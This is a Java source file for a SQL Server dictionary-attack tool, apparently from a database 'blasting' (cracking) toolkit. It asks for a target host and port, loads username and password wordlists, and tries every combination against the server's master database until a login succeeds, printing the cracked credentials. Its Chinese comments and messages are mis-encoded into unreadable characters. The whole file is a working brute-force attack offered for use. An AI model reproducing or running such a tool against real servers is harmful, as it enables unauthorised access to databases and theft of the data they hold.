package MssqlDbBlasting;

import java.io.IOException;
import java.io.InputStream;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.Scanner;

import util.IpOrPortIsOnline;
import util.Time;

/**
 * Mssql�˺������ƽ�ģ��
 * 
 * @author Bearcat Mail:hacker.bear.cat@qq.com
 * @since JDK 1.8
 * @version 1.0 2017-04-8
 */
public class MsSQLScript {

	static String[] dbUsername = {};
	static String[] dbPassword = {};

	public static void username() throws IOException {
		InputStream file = MsSQLScript.class.getResourceAsStream("username.CrackDb");
		byte[] rbs = new byte[9999];
		file.read(rbs);
		String str = new String(rbs);
		dbUsername = str.split(System.getProperty("line.separator"));
	}

	public static void password() throws IOException {
		InputStream file = MsSQLScript.class.getResourceAsStream("password.CrackDb");
		byte[] rbs = new byte[999999];
		file.read(rbs);
		String str = new String(rbs);
		dbPassword = str.split(System.getProperty("line.separator"));
	}
	
	public static void Mssql(String dbUsernames){
		
		String dbHost = null; // SQL Server���ݿ��ַ
		int dbPort = 0; // SQL Server���ݿ�˿�
		System.out.print("===========================================================================\n");
		System.out.print("\t\t\tSQL Server�˺����뱬��ģ��\n");
		System.out.print("===========================================================================\n");
		System.out.print("SQL Server-DB-Host-IP:");
		dbHost = new Scanner(System.in).nextLine();
		System.out.print("Port:");
		dbPort = new Scanner(System.in).nextInt();
		
		if(IpOrPortIsOnline.isPing(dbHost)){
			if(IpOrPortIsOnline.isHostConnectable(dbHost, dbPort)){
				// ��ʼ���ֵ�
				try {
					username();
					password();
				} catch (IOException e1) {
					System.out.println("�ֵ����ʧ��");
				}
				
				Connection conn = null;
				
				if(dbUsernames.equals("username.CrackDb")){
					System.out.print("==================================��ʼ����==================================\n");
					OK:for (int username = 0; username < dbUsername.length; username++) {
						for (int password = 0; password < dbPassword.length; password++) {
							try {
								conn = DriverManager.getConnection("jdbc:sqlserver://"+ dbHost +":" + dbPort + ";DatabaseName=master;", dbUsername[username], dbPassword[password]);
								System.err.println("\t|\t��ϲ���Ƴɹ�\t�˺ţ�" + dbUsername[username] + "\t" + "���룺" + dbPassword[password] + "\t|");
								conn.close();
								break OK;
							} catch (SQLException e) {
								System.out.println(Time.time() + " [INFO] " + (dbUsername.length + dbPassword.length - username - password) + "/username.CrackDb && password.CrackDb");
								continue;
							}
						}
					}
					System.out.print("==================================���ƽ���==================================\n");
					if (conn == null) {
						System.err.println("\t\t\t���ź�������ֵ䲻��ǿ��");
					}
				}else{
					System.out.print("==================================��ʼ����==================================\n");
					for (int password = 0; password < dbPassword.length; password++) {
						try {
							conn = DriverManager.getConnection("jdbc:sqlserver://"+ dbHost +":" + dbPort + ";DatabaseName=master;", dbUsernames, dbPassword[password]);
							System.err.println("\t|\t��ϲ���Ƴɹ�\t�˺ţ�" + dbUsernames + "\t" + "���룺" + dbPassword[password] + "\t|");
							conn.close();
							break;
						} catch (SQLException e) {
							System.out.println(Time.time() + " [INFO] " + (dbPassword.length - password) + "/dbUsername:"+ dbUsernames +" && password.CrackDb");
							continue;
						}
					}
					System.out.print("==================================���ƽ���==================================\n");
					if (conn == null) {
						System.err.println("\t\t\t�ֵ䲻��ǿ���ƽ�δ�ܳɹ���");
					}
				}
			}else{
				System.err.println("\t\t\t\tĿ��SQL Server�����˿ڲ���ȷ��");
			}
		}else{
			System.err.println("\t\t\tĿ��SQL Server����IP��ַ����(������)��");
		}
	}
}